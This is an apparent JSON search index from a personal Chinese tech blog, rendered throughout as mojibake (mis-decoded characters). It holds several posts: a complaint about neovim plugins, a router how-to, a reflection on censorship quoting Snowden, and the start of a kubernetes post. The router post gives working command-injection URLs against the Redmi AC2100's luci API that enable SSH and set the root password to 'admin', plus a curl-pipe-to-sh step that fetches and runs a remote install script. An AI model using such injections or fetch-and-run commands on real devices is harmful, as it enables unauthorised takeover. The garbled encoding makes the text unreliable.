è¿ç»­åˆå¿«é€ŸæŒ‰ä¸‹äº”ä¸ªé”®ï¼ˆæ…¢äº†nvimå°±ä¸è®¤äº†ï¼‰ï¼Œè¿™ä¸ªé”®ä½åªé€‚ç”¨äºå…‰æ ‡æ‰€å¤„åœ¨çš„è¯è¯­ï¼Œå¦‚æœè¦ä¸ºä¸€æ®µè¯æ·»åŠ å‘¢ï¼Ÿé‚£è¿˜ä¼šæœ‰åˆ«çš„é”®ä½ï¼Œä½†æ˜¯å¦‚æœæ˜¯é¼ æ ‡çš„è¯å°±è¿˜æ˜¯åŒæ ·çš„æ“ä½œã€‚\nä»è¿™é‡Œå°±å¯ä»¥æš´éœ²å‡ºvim/neovimçš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šå…¨é”®ç›˜æ“ä½œè¿«ä½¿vimç”¨æˆ·å°†æ›´å¤šçš„é”®ä½åˆ†é…ç»™æ›´åŠ ç»†ç²’åº¦çš„æ“ä½œè¡Œä¸ºä¸Šï¼Œç»™åŸæœ¬ç–²äºåº”ä»˜å·¥ä½œçš„å¤§è„‘å†åŠ ä¸Šä¸€æ ¹ç¨»è‰\næ’ä»¶ä¹‹é—´ç¼ºä¹éš”ç¦» è¿™ä¸ªé—®é¢˜åœ¨æˆ‘æŠ˜è…¾æœŸé—´ç¡®å®å­˜åœ¨ï¼Œå³ä¾¿ä¸æ˜æ˜¾ï¼Œä½†æ˜¯æ—¶ä¸æ—¶ä¼šè·³å‡ºæ¥ç»Šä½ ä¸€ä¸‹ã€‚æˆ‘åœ¨githubçš„issueä¸­çœ‹åˆ°è¿‡å¤ªå¤šå› ä¸ºå®‰è£…äº†åˆ«çš„æ’ä»¶è€Œå¯¼è‡´è¿™ä¸ªæ’ä»¶çš„è¿è¡Œå‡ºç°äº†é—®é¢˜ã€‚ä¸¾ä¸€ä¸ªæ¼äººçš„å…¸å‹æ¡ˆä¾‹ï¼Œè¿™ä¸ªæ¡ˆä¾‹ä¹Ÿæ˜¯è®©æˆ‘ç¬¬ä¸€æ¬¡å¯¹neovimçš„æ’ä»¶ç”Ÿæ€äº§ç”Ÿäº†æ€€ç–‘ï¼Œé‚£å°±æ˜¯nvim-treeï¼Œè¿™ä¸ªæ’ä»¶å¾ˆå¥½ï¼Œéå¸¸å¥½ï¼Œåªæ˜¯æœ‰ä¸€ä¸ªå°å°çš„ç¼ºç‚¹ï¼šå®ƒåšä¸åˆ°è‡ªåŠ¨é€€å‡ºï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å½“ä½ å…³æ‰å½“å‰ç¼–è¾‘çš„è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œå¦‚æœä½ çš„nvim-treeå¼€ç€ï¼Œé‚£ä¹ˆå°±è¦å¤šæ‰§è¡Œä¸€æ¬¡:qï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæ¼äººçš„é—®é¢˜ï¼Œè€Œåœ¨nvim-treeçš„wikiä¸Šå†™åˆ°\nUnfortunately such functionality is problematic and is not present in nvim-tree:\nvim events are the only mechanism we can use for auto close vim events are unpredictably ordered, especially when other plugins and automation are involved BufEnter is the last event that can be acted upon and that event can have side effects Event nesting may be disabled by other plugins / automation, resulting in missing events other plugins ! è¿™ä¸ç¦è®©æˆ‘æƒ³åˆ°äº†æ—§ç‰ˆç«ç‹æ’ä»¶ï¼Œé«˜è‡ªç”±åº¦å¿…å®šå’Œéš”ç¦»æ€§æœ‰åºæ€§ç›¸äº’è¿èƒŒï¼Œå°¤å…¶æ˜¯å¯¹äºæ­£å¤„äºæ–°å…´é˜¶æ®µè¿…çŒ›å‘å±•çš„neovimæ›´æ˜¯å¦‚æ­¤ã€‚\næ’ä»¶ç”Ÿæ€çš„æ··ä¹± æˆ‘åœ¨å†™è¿™ç¯‡åæ§½çš„å‰ä¸€å¤©é€ä¸ªæ£€æŸ¥æˆ‘å¹³æ—¶ä½¿ç”¨çš„æ’ä»¶ï¼Œå‘ç°å·²ç»æœ‰å‡ ä¸ªæ’ä»¶çš„ä½œè€…åœ¨githubé¡µé¢ä¸Šå†™ç€ç±»ä¼¼äºâ€œä¸å†æ›´æ–°äº†ï¼Œå»ç”¨xxxå§ï¼Œé‚£ä¸ªæ›´å¥½â€çš„è¯ï¼Œè¿™è·ç¦»æˆ‘ä¸Šæ¬¡æ£€æŸ¥æ‰è¿‡å»ä¸¤ä¸ªæœˆå•Šã€‚æœ‰äº›ä½œè€…ä»…ä»…åªæ˜¯è§‰å¾—è‡ªå·±å†™çš„ä¸œè¥¿æ¯”è¾ƒå·®å°±ç´¢æ€§ä¸å†æ›´æ–°äº†ï¼Œemmmmmmï¼Œç¡®å®ï¼Œä¸èƒ½æ€ªä½œè€…ï¼Œè¦æ€ªå°±æ€ªç”¨æˆ·å€’éœ‰å§ï¼Œè°è®©è¿™æ˜¯å¼€æºå‘¢ï¼ŒåŒ…æ‹¬æˆ‘åœ¨å†…çš„å¤§éƒ¨åˆ†ç”¨æˆ·åªèƒ½è¢«è¿«ä»ä¸€ä¸ªæ’ä»¶æ¢åˆ°å¦ä¸€ä¸ªæ’ä»¶ï¼Œä»kommentaryæ¢åˆ°Comment.nvimï¼Œä»lspinstalleræ¢åˆ°mason.nvimâ€¦â€¦æˆ‘ä¸çŸ¥é“æˆ‘åœ¨è¿½é€ä»€ä¹ˆï¼Œåœ¨æˆ‘è¿™ä¸ªå¤–è¡Œçœ‹æ¥ä»–ä»¬åšçš„äº‹æƒ…ä¸åº”è¯¥æ˜¯ä¸€æ ·çš„å—ï¼Ÿ\næ€€ç–‘è¶Šç§¯è¶Šå¤šï¼Œæœ€ç»ˆæˆ‘ç´¯äº†ï¼Œæˆ‘åœä¸‹äº†è„šæ­¥ï¼Œé€‰æ‹©äº†vscodeã€‚æˆ–è®¸å“ªå¤©ç­‰æ’ä»¶ç”Ÿæ€é€æ¸ç¨³å®šä¸‹æ¥ä¹‹åæˆ‘ä¼šå†å›æ¥çœ‹çœ‹å§ã€‚\nå†™è¿™ä¹ˆå¤šï¼Œä¸æ˜¯å› ä¸ºè®¨åŒï¼Œåªæ˜¯ä¸ºäº†è®°å½•ã€‚å›æœ›neovimè¿™å‡ å¹´çš„å‘å±•ï¼Œå¯ä»¥çœ‹å‡ºå…¶åŠ¿å¤´éå¸¸å‡¶çŒ›ï¼Œå°¤å…¶æ˜¯åœ¨è¿™ä¸¤å¹´å¢åŠ äº†lspå’Œtreesitterä¹‹åï¼Œå¸Œæœ›å®ƒæœªæ¥ä¼šè¶Šæ¥è¶Šå¥½å§ï¼Œå› ä¸ºå®ƒå¯¹æˆ‘æ¥è¯´ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç¼–è¾‘å™¨äº†ï¼Œå®ƒè¿˜æ˜¯æˆ‘å¤§å­¦æ‡µæ‡‚æ—¶æœŸä¹è¶£çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯å›å¿†é‡Œçš„ä¸€å—æ‹¼å›¾äº†ã€‚\n","permalink":"https://dragonbox.top/posts/tech-thinking-about-vim/","summary":"\u003cblockquote\u003e\n\u003cp\u003eåœ¨æ¶ˆç£¨ä¸‰å¹´æ—¶å…‰ä¹‹åï¼Œæˆ‘ç»ˆäºæ˜ç™½è¿™ä¸ªç¼–è¾‘å™¨è¿˜è¿œè¿œç§°ä¸ä¸Šç¨³å®šï¼Œåœ¨é“è·¯çš„å°½å¤´ä¹‹å‰ï¼Œæˆ‘èƒ½åšçš„å…¶å®åªæœ‰è§‚æœ›ã€‚\u003c/p\u003e\n\u003c/blockquote\u003e","title":"vim/neovim çš„é—®é¢˜"},{"content":" åœ¨äº‰å–è‡ªç”±è¿™ä¸ªå®å¤§å‘½é¢˜ä¸‹, ä¸Šç½‘è‡ªç”±å¯ä»¥ç®—å¾—ä¸Šä¸€ä»¶\u0026quot;å°äº‹\u0026quot;, ç„¶è€Œè¶Šæ˜¯å°äº‹, è¶Šä¸æˆ‘ä»¬çš„æ—¥å¸¸æ¯æ¯ç›¸å…³.\näº‹æƒ…çš„èµ·å› æ˜¯è£…kubernetesé‡åˆ°äº†ç½‘ç»œé—®é¢˜ä¸”æ¢é•œåƒæºæ— ç”¨, æƒ³äº†æƒ³è‡ªå·±å¯¹åœ¨è·¯ç”±å™¨ä¸Šfqä¹Ÿæ„Ÿå…´è¶£äº†å¾ˆä¹…, ç´¢æ€§æŸ¥æŸ¥çœ‹, æ²¡æƒ³åˆ°è¿˜æŒºå®¹æ˜“çš„.\nå¼€å¯ssh ac2100è¿™ä¸ªå‹å·çš„è·¯ç”±å™¨å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´, å¯ä»¥é€šè¿‡è¯¥æ¼æ´å¼€å¯clash.\nç™»é™†åˆ°è·¯ç”±å™¨é¢æ¿,ä»urlä¸­å¤åˆ¶stok,æ›¿æ¢ä¸‹é¢çš„stok\n# å‘½ä»¤æ‰§è¡Œæ¼æ´å¼€å¯ssh http://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/misystem/set_config_iotdev?bssid=Xiaomi\u0026amp;user_id=longdike\u0026amp;ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20\u0026#39;s%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg\u0026#39;%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B # å‘½ä»¤æ‰§è¡Œæ¼æ´ä¿®æ”¹sshå¯†ç , è¿™é‡Œç”¨çš„å¯†ç ä¸ºadmin http://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/misystem/set_config_iotdev?bssid=Xiaomi\u0026amp;user_id=longdike\u0026amp;ssid=-h%3B%20echo%20-e%20\u0026#39;admin%5Cnadmin\u0026#39;%20%7C%20passwd%20root%3B ç„¶ååœ¨è‡ªå·±çš„ç”µè„‘ä¸Šsshè¿æ¥,å¯†ç admin\nssh root@192.168.31.1 å¦‚æœæŠ¥é”™äº†,å°±åœ¨.ssh/configä¸­æ·»åŠ \nHost 192.168.31.1 PubkeyAcceptedAlgorithms +ssh-rsa HostkeyAlgorithms +ssh-rsa å®‰è£…clash sshç™»é™†åˆ°è·¯ç”±å™¨å, è¿è¡Œ:\nexport url=\u0026#39;https://cdn.jsdelivr.net/gh/juewuy/ShellClash@master\u0026#39; \u0026amp;\u0026amp; sh -c \u0026#34;$(curl -kfsSl $url/install.sh)\u0026#34; \u0026amp;\u0026amp; source /etc/profile \u0026amp;\u0026gt; /dev/null é¢æ¿å®‰è£…ä¸æˆåŠŸçš„è¯å°±æ¢æºè£….å…¶ä»–å°±è·Ÿç€è„šæœ¬çš„æç¤ºèµ°å°±å¯ä»¥äº†\n","permalink":"https://dragonbox.top/posts/tech-clash-ac2100/","summary":"\u003cblockquote\u003e\n\u003cp\u003eåœ¨äº‰å–è‡ªç”±è¿™ä¸ªå®å¤§å‘½é¢˜ä¸‹, ä¸Šç½‘è‡ªç”±å¯ä»¥ç®—å¾—ä¸Šä¸€ä»¶\u0026quot;å°äº‹\u0026quot;, ç„¶è€Œè¶Šæ˜¯å°äº‹, è¶Šä¸æˆ‘ä»¬çš„æ—¥å¸¸æ¯æ¯ç›¸å…³.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"åœ¨çº¢ç±³ac2100è·¯ç”±å™¨ä¸Šå¼€å¯clash"},{"content":" è¶…å…ƒåŸŸè¿™ä¸ªè¯, å‡ºè‡ªé›ªå´©è¿™æœ¬ä¹¦, äººä»¬åœ¨è¿™ä¸ªè™šæ‹Ÿä¸–ç•Œä¸­å¯ä»¥éšæ„è¡Œäº‹, å°½æƒ…åšè‡ªå·±, è¿™ä¹Ÿæ˜¯æˆ‘çš„åˆè¡·: æŠŠå‘è¨€æƒè¿˜ç»™æˆ‘\nå¯¹äºè‡ªå·±çš„åšå®¢, æˆ‘å…¶å®æ˜¯æŠ±ç€ä¸€ç§çŸ›ç›¾çš„å¿ƒæ€å»ç®¡ç†çš„: ä¸€æ–¹é¢, åœ¨é˜¿é‡Œäº‘ä¹°äº†æœåŠ¡å™¨å°†è‡ªå·±çš„åšå®¢éƒ¨ç½²åœ¨ä¸Šé¢åç¡®å®è®©å›½å†…ç”¨æˆ·å¯ä»¥çœ‹åˆ°æˆ‘å†™çš„åƒåœ¾äº†, ä¹‹å‰æ— æ„è®¤è¯†çš„ä¸€ä¸ªå¸ˆå‚…å°±å‘Šè¯‰æˆ‘è¯´ä»¥å‰è¿˜çœ‹è¿‡æˆ‘çš„åšå®¢, è®©æˆ‘è§‰å¾—æœ‰äº›å¼€å¿ƒ; å¦ä¸€æ–¹é¢, æˆ‘åˆå¿…é¡»åœ¨å›½å†…å¤‡æ¡ˆ, éœ€è¦å®ååˆ¶, éœ€è¦åœ¨åšå®¢çš„åº•éƒ¨æ‚¬æŒ‚ä¸€ä¸ªå¯ç¬‘çš„å¤‡æ¡ˆå·æ¥è¡¨è¾¾è‡ªå·±å·²ç»è¢«æ‹›å®‰äº†, æ—¢ç„¶è¢«æ‹›å®‰, é‚£ä¹ˆå¾ˆå¤šæˆ‘æƒ³è¯´çš„è¯, æˆ‘æƒ³åˆ†äº«çš„æœ‰ä»·å€¼çš„ä¸œè¥¿, å°±ä¸æ•¢è¯´ä¹Ÿä¸æƒ³è¯´äº†.\nè¿™ç§å¿ƒæ€å›°æ‰°äº†æˆ‘å¾ˆä¹…, ä¹Ÿå› ä¸ºæˆ‘ç¡®å®ä¸å†æå®‰å…¨äº†, äºæ˜¯å°±æ²¡å†æ›´æ–°æœ‰ä»·å€¼çš„ä¸œè¥¿äº†. è¿™ç§æƒ…å†µä¸€ç›´æŒç»­, ç›´åˆ°å‘ç°å…¶å®æˆ‘çš„ä¸œè¥¿å¹¶æ²¡æœ‰ä»€ä¹ˆäººä¼šæ¥çœ‹, ä¹Ÿæ²¡æœ‰æŠ€æœ¯ä½¬å¯¹æˆ‘æ–‡ç« é‡Œçš„ç‘•ç–µå’ŒåŠ¨æœºæŒ‡æŒ‡ç‚¹ç‚¹, å†™åšå®¢çš„ä»·å€¼æ›´å¤šæ˜¯é­ç­–è‡ªå·±è€Œä¸æ˜¯å¯¹åˆ«äºº. æƒ³å¼€äº†ä¹‹åæˆ‘å°±å†æ— é¡¾å¿Œäº†, æ­£å¥½é˜¿é‡Œäº‘çš„æœåŠ¡å™¨ä¹Ÿåˆ°æœŸäº†, åŸæ¥çš„åšå®¢é”€æ¯, æˆ‘æŠŠåšå®¢æ”¾åœ¨äº†git pageä¸Š, å»æ‰äº†é‚£å¦‚åŒç½ªçŠ¯çƒ™å°èˆ¬çš„å›½å†…å¤‡æ¡ˆå·.\næ›¾ç»çš„è‡ªå·±, æ˜¯çœŸçš„æƒ³ä¸€ç›´è®©å›½å†…äººçœ‹åˆ°è‡ªå·±å†™çš„åšå®¢çš„, ä¸ºæ­¤é‚£ä¸ªæ—¶å€™æˆ‘ç»­è´¹äº†ä¸‰å¹´çš„æœåŠ¡å™¨, ä½†æ˜¯è¿™ä¸¤å¹´çš„èˆ†è®ºå®¡æŸ¥, æƒåŠ›æ»¥ç”¨è¿˜æœ‰ç½‘ç»œæš´åŠ›, è®©å›½å†…çš„ç¯å¢ƒçœ‹èµ·æ¥è¶Šæ¥è¶Šæœ‰é»‘æš—æ£®æ—çš„å‘³é“äº†. å¤±æœ›å’Œæ— å¥ˆè®©æˆ‘æœ€ç»ˆæ”¾å¼ƒäº†å½“åˆå¤©çœŸçš„æƒ³æ³•, æ­£å¥½, æœ‰å¹¸åœ¨bç«™ä¸Šé€šè¿‡çœ‹ç“¶å­å›çš„ç›´æ’­é—´çŸ¥é“äº†æ–¯è¯ºç™»çš„æ°¸ä¹…è®°å½•è¿™æœ¬ä¹¦, äºæ˜¯æœ‰å¹¸æ‹œè¯»äº†ä¸€ä¸‹, ç»™æˆ‘å°è±¡æœ€æ·±åˆ»çš„ç‰‡æ®µå¦‚ä¸‹:\næˆ‘å›å¤´é‡çœ‹ä»¥å‰çš„å¸–æ–‡,å¼€å§‹ç•ç•ç¼©ç¼©èµ·æ¥ã€‚å½“æ—¶è¯´çš„è¯æœ‰ä¸€åŠæ˜¯æ— å¿ƒä¹‹è®º,æˆ‘åªæƒ³å¼•äººæ³¨æ„,æ²¡æƒ³è¿‡æœ‰ä¸€å¤©è¦å¯¹ä¸€ä½æˆ´ç€æ–¹æ¡†çœ¼é•œçš„ç™½å‘ç”·å­åšè§£é‡Š,ä»–çš„è§†çº¿æ‰«è¿‡è´´ç€â€œæ°¸ä¹…ä¿å­˜è®°å½•â€æ ‡ç­¾çš„å·¨å‹èµ„æ–™å¤¹ã€‚è€Œå¦ä¸€åŠè¨€è®º,æˆ‘æƒ³å½“æ—¶æ˜¯æœ‰å¿ƒè¿™ä¹ˆè¯´çš„,è¿™è®©æƒ…å†µæ›´ç³Ÿ,å› ä¸ºæˆ‘ä¸å†æ˜¯å½“å¹´é‚£ä¸ªæ‡µæ‡‚æ— çŸ¥çš„å­©å­,æˆ‘å·²ç»é•¿å¤§æˆäººã€‚è¿æˆ‘éƒ½è®¤ä¸å‡ºè‡ªå·±è¯´è¿‡è¿™æ ·çš„è¯ã€‚è¿˜æœ‰ä¸ªé—®é¢˜æ˜¯,ç°åœ¨æˆ‘å¯¹é‚£äº›æ¿€æƒ…åˆå†²åŠ¨çš„è§‚ç‚¹å¿ƒç”Ÿåæ„Ÿã€‚æˆ‘å‘ç°è‡ªå·±è¦è·Ÿå¹½çµäº‰è¾©,è¦è·Ÿæ„šè ¢ã€å¹¼ç¨šã€å¶å°”éœ²å‡ºæ®‹é…·é¢çš„è‡ªæˆ‘æ‰“ä¸€æ¶,ä½†è¿™æ ·çš„æˆ‘å·²ä¸å¤å­˜åœ¨ã€‚æƒ³åˆ°å¯èƒ½æ°¸è¿œè¢«è¿™ç§é¬¼é­…çº ç¼ ,æˆ‘æ²¡åŠæ³•å¿å—,å¯åˆä¸çŸ¥æœ‰ä»€ä¹ˆæœ€å¥½çš„æ–¹æ³•æ¥è¡¨è¾¾æˆ‘çš„è‡ªè´£æ‡Šæ‚”,è®©æˆ‘ä¸å…¶ä¿æŒè·ç¦»,æˆ‘ä¹Ÿç–‘æƒ‘ç©¶ç«Ÿè¯¥ä¸è¯¥è¿™ä¹ˆåšã€‚é‚£äº›æˆ‘åæ‚”ä¸å·²å´åˆå‡ ä¹é—å¿˜çš„è¿‡å»,ä¾æ—§é€šè¿‡ç§‘æŠ€æ­»ç¼ ç€æˆ‘ä¸æ”¾,å®åœ¨ä»¤äººå‘æŒ‡ã€‚\næˆ‘ä»¬è¿™ä¸ªæœ€å…ˆåœ¨ç½‘ç»œç¯å¢ƒä¸­æˆé•¿çš„ä¸–ä»£,å¯¹è¿™æ ·çš„é—®é¢˜å†ç†Ÿæ‚‰ä¸è¿‡ã€‚æˆ‘ä»¬å‘æ˜æ¢ç´¢å‡ ä¹å®Œå…¨ä¸å—ç›‘ç£çš„èº«ä»½,ä»æ¥ä¸ä¼šå¤©çœŸåœ°ä»¥ä¸ºæˆ‘ä»¬è¯´è¿‡çš„é²è½è¨€è®ºå’Œé»„è‰²ç¬‘è¯èƒ½ä¸€ç¬”å‹¾é”€,äº‹å®ä¼šæ°¸ä¹…ä¿å­˜ä¸‹æ¥,è€Œä¸”æœ‰ä¸€å¤©ä¼šæœŸå¾…æˆ‘ä»¬åšå‡ºè§£é‡Šã€‚æ¯ä¸ªäººæƒ³å¿…éƒ½æœ‰åœ¨ç½‘ä¸Šå‘å¸ƒå°´å°¬å¸–æ–‡çš„ç»éªŒ,ä¸ç„¶å°±æ˜¯ç®€è®¯æˆ–ç”µå­é‚®ä»¶,å¯èƒ½ä¼šå®³å¾—ä»–ä»¬è¢«ç‚’é±¿é±¼ã€‚åœ¨æ‰¾åˆ°å·¥ä½œå‰æœ‰ä¸Šç½‘ç»éªŒçš„äºº,æˆ‘æ•¢è‚¯å®šå¯¹è¿™æ ·çš„æƒ…å†µæ„ŸåŒèº«å—ã€‚\nä¸è¿‡æˆ‘çš„æƒ…å†µåˆå¦å½“åˆ«è®º,æˆ‘å¤§éƒ¨åˆ†çš„ç½‘ç»œç•™è¨€æ¿èƒ½åˆ é™¤æ—§å¸–æ–‡,æˆ‘çš„å¸–æ–‡å¯ä»¥åœ¨ä¸åˆ°ä¸€å°æ—¶å†…å…¨éƒ¨åˆ é™¤,é‚£æˆ–è®¸æ˜¯è¿™ä¸–ä¸Šæœ€è½»è€Œæ˜“ä¸¾çš„äº‹ã€‚ç›¸ä¿¡æˆ‘,æˆ‘è€ƒè™‘è¿‡è¿™ä¹ˆåšã€‚\nå¯æ˜¯æˆ‘ç»ˆç©¶æ²¡è¿™ä¹ˆåš,æŸç§åŸå› é˜»æ­¢äº†æˆ‘,å°±æ˜¯è§‰å¾—ä¸è¯¥å¦‚æ­¤ã€‚è®©æˆ‘çš„å¸–æ–‡ä»åœ°çƒä¸Šæ¶ˆå¤±ä¸çŠ¯æ³•,è€Œä¸”ä¸‡ä¸€æœ‰å¿ƒäººæƒ³å»æŒ–,æˆ‘ä¹Ÿä¸ç”¨å†’ç€èº«å®¶è°ƒæŸ¥ä¸åˆæ ¼çš„é£é™©ã€‚ä¸è¿‡,åˆ é™¤å¸–æ–‡çš„å¯èƒ½åæœè®©æˆ‘å¿ƒçƒ¦æ„ä¹±,é‚£ä¹ˆåšåªä¼šå¼ºåŒ–ç½‘ç»œç”Ÿæ´»ä¸­çš„ä¸€äº›æœ€è…èš€äººå¿ƒçš„è®­è¯«:æ²¡äººæœ‰çŠ¯é”™ç©ºé—´,å‡¡æ˜¯çŠ¯é”™è€…,éƒ½è¦ä¸€è¾ˆå­ä¸ºè‡ªå·±çš„é”™è¯¯è´Ÿè´£ã€‚æˆ‘åœ¨æ„çš„å€’ä¸æ˜¯æ–‡å­—è®°å½•æ˜¯å¦å®Œç¾æ— ç¼º,è€Œæ˜¯çµé­‚çš„å®Œæ•´æ€§ã€‚æˆ‘ä¸æƒ³æ´»åœ¨ä¸€ä¸ªäººäººå¿…é¡»å‡è£…å®Œç¾çš„ä¸–ç•Œé‡Œ,é‚£æ ·çš„ä¸–ç•Œæ²¡æœ‰æˆ‘å’Œæœ‹å‹çš„å®¹èº«ä¹‹å¤„ã€‚æŠ¹æ‰ç½‘ä¸Šçš„è¯„è®º,ç­‰äºæŠ¹æ€äº†æˆ‘æ˜¯è°,æˆ‘ä»å“ªé‡Œæ¥,æˆ‘èµ°äº†å¤šè¿œã€‚å¦å®šå¹´å°‘æ—¶çš„æˆ‘,ç­‰äºå¦å®šç°åœ¨çš„æˆ‘çš„åˆæ³•æ€§ã€‚\næˆ‘å†³å®šç•™ä¸‹è¿™äº›ç½‘ç»œè¯„è®º,æƒ³å‡ºä¸å®ƒä»¬å…±å¤„çš„æ–¹å¼ã€‚æˆ‘ç”šè‡³æ‹¿å®šä¸»æ„,æ—¢ç„¶è¦å¿ äºè¿™ä¸ªç«‹åœº,å°±å¾—ç»§ç»­åœ¨ç½‘ç»œä¸Šå‘æ–‡ã€‚æˆ‘ä¹ŸåŠæ—¶é•¿å¤§,ä¸å†å¯¹æ ‡æ–°ç«‹å¼‚çš„æ„è§ç…§å•å…¨æ”¶,ä¸è¿‡æˆ‘çš„åŸå§‹å†²åŠ¨ä¾ç„¶æ²¡æœ‰åŠ¨æ‘‡,å³ä¾¿åªå› ä¸ºé‚£æ˜¯æˆ‘è¿ˆå‘æˆç†Ÿçš„é‡è¦ä¸€æ­¥ã€‚æ—¢ç„¶æŠ¹ä¸æ‰ç½‘ç»œä¸Šé‚£äº›ä»¤æˆ‘ä»¬ä¸¢è„¸ç¾æ„§çš„è¨€è¡Œ,æˆ‘ä»¬èƒ½åšçš„å°±æ˜¯æ§åˆ¶è‡ªå·±çš„ååº”â€”â€”æ˜¯ä¸ºäº†è¿™äº›è¿‡å»è‡ªæˆ‘æŠ˜ç£¨,è¿˜æ˜¯æ¥å—è¿‡å»å¸¦ç»™æˆ‘ä»¬çš„æ•™è®­,ç„¶åæˆé•¿ã€å‰è¿›ã€‚\né‚£æ˜¯æˆ‘åœ¨é—²æ•£æ—¶æœŸæƒ³åˆ°çš„ç¬¬ä¸€ä»¶äº‹,æˆ–è®¸å¯ä»¥ç§°ä¹‹ä¸ºåŸåˆ™,å°½ç®¡æ‰§è¡Œä¸æ˜“,æˆ‘ä»åŠªåŠ›é å®ƒè¿‡æ´»ã€‚\nå¿…é¡»æ‰¿è®¤è‡ªå·±åšä¸åˆ°æ–¯è¯ºç™»é‚£ä¹ˆå¦ç„¶. æˆ‘æ›´æ¢äº†è‡ªå·±åŸæœ¬è¶³å¤Ÿæš´éœ²éšç§çš„id, å°½åŠ›åœ¨ç½‘ç»œä¸Šæ‰«æ¸…è‡ªå·±æ›¾ç»ç•™ä¸‹çš„ç—•è¿¹, ç„¶åé€‰æ‹©åœ¨è¿™ä¸ªéšè”½çš„åœ°æ–¹è‡ªå·±ä¿ç•™è‡ªå·±çš„å‘è¨€æƒ, é‡æ–°å¼€å§‹.\nåªæ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­, ç”±äºè‡ªå·±çš„å¤‡ä»½åšçš„ä¸å¥½, å¾ˆå¤šå›¾ç‰‡æ–‡ä»¶éšç€æ—¶é—´æ¨ç§»é—å¤±äº†, çœŸçš„æŒºåæ‚”çš„. å¦‚æœæœ‰äººçœ‹çš„æ—¶å€™å‘ç°å›¾ç‰‡ç¼ºå¤±, é‚£ä¹ˆçœŸçš„å¾ˆæŠ±æ­‰æµªè´¹äº†ä½ çš„æ—¶é—´.\nåšå®¢äºæˆ‘çš„æ„ä¹‰, é¦–å…ˆæ˜¯è®°å½•. æˆ‘å½“ç„¶æ˜¯æœ‰è‡ªå·±çš„ç¬”è®°è½¯ä»¶çš„, ä½†æ˜¯ä»2019å¹´å¼€å§‹, æˆ‘å…ˆåä½¿ç”¨äº†typora, joplin, trilium, obsidian, æœŸé—´ä¹Ÿç»å†è¿‡æ•°æ¬¡ç³»ç»Ÿé‡è£…, åœ¨è¿™æŠ˜è…¾çš„è¿‡ç¨‹ä¸­, ä¸å°‘çš„ç¬”è®°é—å¤±äº†, å½“ç„¶æœ€é‡è¦çš„åŸå› ä¾æ—§æ˜¯æˆ‘æ²¡æœ‰åšå¥½å¤‡ä»½,\nè¿™ä¸ªæ—¶å€™, åšå®¢çš„ä»·å€¼å°±å‡ºæ¥äº†, æ¯å½“æˆ‘çœ‹åˆ°è‡ªå·±æ›¾ç»åˆ·bugkuçš„ç¬”è®°è¿˜åœ¨åšå®¢ä¸Šå¥½ç«¯ç«¯çš„å‘†ç€, å°½ç®¡å®ƒå†™çš„å¾ˆçƒ‚, ä½†æ˜¯æ¯æ¬¡çœ‹åˆ°, æˆ‘éƒ½ä¼šæƒ³èµ·2018å¹´çš„å†¬å¤©è‡ªå·±ç¬¨æ‹™åœ°çœ‹ç€ç½‘ä¸Šçš„wpå¤ç°ç„¶åç”¨wordå’ŒAtomè®°ç¬”è®°çš„è‡ªå·±, çœŸçš„å¾ˆæ€€å¿µ.\nå¦ä¸€ä¸ªä½œç”¨æ˜¯é­ç­–è‡ªå·±è¾“å…¥, ä»è€Œåå‘æ¨åŠ¨è‡ªå·±å¤šåŠ å­¦ä¹ , å½“ç„¶, å¿…é¡»æ˜¯åœ¨æˆ‘å¯¹è‡ªå·±è´Ÿè´£çš„å¿ƒæ€ä¸‹æ‰å¯ä»¥è¾¾åˆ°è¿™æ ·çš„æ•ˆæœ.\nä¸è¿‡, å¦‚å‰æ–‡æ‰€è¿°, æˆ‘ç°åœ¨å·²ç»ä¸å¤ªä¼šå…³å¿ƒåˆ«äººæ˜¯æ€ä¹ˆçœ‹å¾…æˆ‘çš„åšå®¢äº†, æ— è®ºä½ æ˜¯è§‰å¾—è¿™é‡Œæ°´åˆ†è¿‡å¤šæŠ€æœ¯è¿‡å°‘, è¿˜æ˜¯æŠ€æœ¯æ–‡ç« è¿‡äºåƒåœ¾è¿‡æ—¶, éƒ½æ— æ‰€è°“, æˆ‘å†™æˆ‘çš„, ä½ è‡ªä¾¿.\n","permalink":"https://dragonbox.top/posts/gossip-boring-note-md/","summary":"\u003cblockquote\u003e\n\u003cp\u003eè¶…å…ƒåŸŸè¿™ä¸ªè¯, å‡ºè‡ªé›ªå´©è¿™æœ¬ä¹¦, äººä»¬åœ¨è¿™ä¸ªè™šæ‹Ÿä¸–ç•Œä¸­å¯ä»¥éšæ„è¡Œäº‹, å°½æƒ…åšè‡ªå·±, è¿™ä¹Ÿæ˜¯æˆ‘çš„åˆè¡·: æŠŠå‘è¨€æƒè¿˜ç»™æˆ‘\u003c/p\u003e\n\u003c/blockquote\u003e","title":"æœåŠ¡å™¨è¿‡æœŸä¹‹å"},{"content":"ç¯å¢ƒé—®é¢˜, ä¸€ç”Ÿä¹‹æ•Œ.\nå‡†å¤‡ ç½‘ç»œé—®é¢˜ è¿™æ˜¯æœ€é‡è¦çš„é—®é¢˜, å›½å†…çš„é‚£äº›å€ŸåŠ©äºé•œåƒæºçš„æ‰­æ›²è§£å†³æ–¹æ¡ˆåœ¨æˆ‘è¿™é‡Œä¸å¥½ä½¿. æ¨èåœ¨è·¯ç”±å™¨ä¸Šå®‰è£…clash\nvirtualboxå®‰è£…ubuntu18.04 è¿™æ­¥æ²¡ä»€ä¹ˆå¥½è®²çš„, è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨æ¡¥æ¥ç½‘ç»œæ¨¡å¼, ä¸ºä»€ä¹ˆ? å› ä¸ºé›†ç¾¤å†…é€šä¿¡, 